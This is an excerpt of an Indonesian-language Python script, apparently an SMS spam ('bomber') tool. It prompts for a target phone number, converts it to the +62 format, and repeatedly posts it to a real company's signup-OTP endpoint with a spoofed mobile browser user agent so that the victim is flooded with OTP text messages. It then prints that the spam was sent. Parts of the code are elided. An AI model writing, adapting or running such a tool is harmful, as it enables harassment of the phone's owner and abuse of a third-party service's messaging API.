...
class nyepam:
	...
	def mulai(self):
		try:
			for x in range(5):
				send=req.post("https://cmsapi.mapclub.com/api/signup-otp",data={"phone":self._8},headers={"Connection": "keep-alive","User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}).text
		...
		except reek.exceptions.ReadTimeout:exit("\x1b[0;31mKoneksi Tidak Stabil")
		except reek.exceptions.ConnectionError:exit("\x1b[0;31mKoneksi Error")
		except (KeyboardInterrupt,EOFError):exit(f"{W}Exited With Code {R}! ! !")
while True:
	try:
		print (f" {Y}Example {R}:{W} 08xx")
		a=input(f"{R} > {W}Nomor {R}:{G} ")
		asu=a[0:2]
		if len(a)<=10:print("\033[36m[\033[33m!\033[36m] \033[32mNomor Bener Tapi kurang angka!")
		else:
			b=a[1:12] 
			c="62"+b
			nyepam(b,a,c).mulai()
			nyepam(b,a,c).mulai()
			print('  \x1b[1;92m✓ \x1b[1;97mSpam Sms Terkirim')
			break
